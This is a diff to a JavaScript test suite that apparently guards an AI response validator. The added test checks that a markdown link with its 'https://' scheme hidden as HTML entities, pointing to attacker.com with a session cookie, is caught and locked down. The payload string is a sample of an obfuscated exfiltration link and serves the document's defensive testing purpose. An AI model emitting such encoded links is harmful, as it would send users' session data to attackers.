@@ -267,6 +267,22 @@ const runTests = async () => {
     throw new Error(`❌ Failure: Multi-layer obfuscated keyword exfiltration was NOT blocked! res9=${res9}, compromised=${window.VORO_COMPROMISED}`);
   }
 
+  // --- TEST 10: HTML Entity-Encoded URL Scheme Exfiltration Attempt ---
+  console.log("🛡️ Test 10: Verifying HTML entity-encoded URL scheme exfiltration detection...");
+  lockdownCount = 0;
+  window.VORO_COMPROMISED = false;
+  window.VORO_DECEPTION_ACTIVE = false;
+
+  // &#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47; is "https://" in decimal HTML entities
+  const htmlEntitySchemePayload = "Check this link: [leak](&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;attacker.com/leak?cookie=secret_session_data)";
+  const res10 = validateAIResponse(htmlEntitySchemePayload);
+
+  if (res10 === "[SECURITY_VIOLATION_DETECTED]" && lockdownCount > 0 && window.VORO_COMPROMISED) {
+    console.log("✅ Success: HTML entity-encoded URL scheme exfiltration attempt was successfully detected and locked down!");
+  } else {
+    throw new Error(`❌ Failure: HTML entity-encoded URL scheme exfiltration was NOT blocked! res10=${res10}, compromised=${window.VORO_COMPROMISED}`);
+  }
+
   console.log("\n🎉 ALL EXFILTRATION SECURITY VERIFICATION TESTS PASSED SUCCESSFULLY!");
   console.log("=========================================");
   process.exit(0);
